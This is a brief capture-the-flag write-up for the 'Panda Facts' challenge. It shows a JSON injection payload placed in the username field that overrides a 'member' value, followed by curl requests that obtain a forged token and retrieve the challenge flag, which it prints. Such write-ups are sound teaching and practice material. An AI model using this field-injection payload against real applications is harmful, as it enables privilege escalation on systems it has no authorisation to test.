# Panda Facts

We have control over the username, and if we modify it we can change the JSON string that's parsed, overwriting the earlier values.

```javascript
╭─zoey@nomadic ~/sec/redpwnctf/panda-facts 
╰─$ node
> let INTEGRITY='12370cc0f387730fb3f273e4d46a94e5';
undefined
> let username='", "member": 1, "username": "test';
undefined
> let parsedToken = JSON.parse(`{"integrity":"${INTEGRITY}","member":0,"username":"${username}"}`)
undefined
> JSON.stringify(parsedToken);
'{"integrity":"12370cc0f387730fb3f273e4d46a94e5","member":1,"username":"test"}'
```

Now we just have to throw our test value into the web requests

```shell-session
╭─zoey@nomadic ~/sec/redpwnctf/panda-facts 
╰─$ curl 'https://panda-facts.2020.redpwnc.tf/api/login' \
  -H 'content-type: application/json' \
  --data-binary '{"username":"\", \"member\": 1, \"username\": \"test"}' \
  
{"token":"UK4cRIQoC6CqgCXpQeQIyU6V0PL6UZ+P/XEROuEd2XqqG77e6Op7ittY2dy0oUppbiLf1hBSSiyq+aWAViCIodkoXy8C+kxL+sSrxZN1fioY3lL8qBvOr3A4u1U/weNoMlXv6k7Y3yJt9BbzMfdsrA=="}                     
╭─zoey@nomadic ~/sec/redpwnctf/panda-facts 
╰─$ curl 'https://panda-facts.2020.redpwnc.tf/api/flag' \
 -H 'cookie: token=UK4cRIQoC6CqgCXpQeQIyU6V0PL6UZ+P/XEROuEd2XqqG77e6Op7ittY2dy0oUppbiLf1hBSSiyq+aWAViCIodkoXy8C+kxL+sSrxZN1fioY3lL8qBvOr3A4u1U/weNoMlXv6k7Y3yJt9BbzMfdsrA=='  
{"success":true,"flag":"flag{1_c4nt_f1nd_4_g00d_p4nd4_pun}"}
```
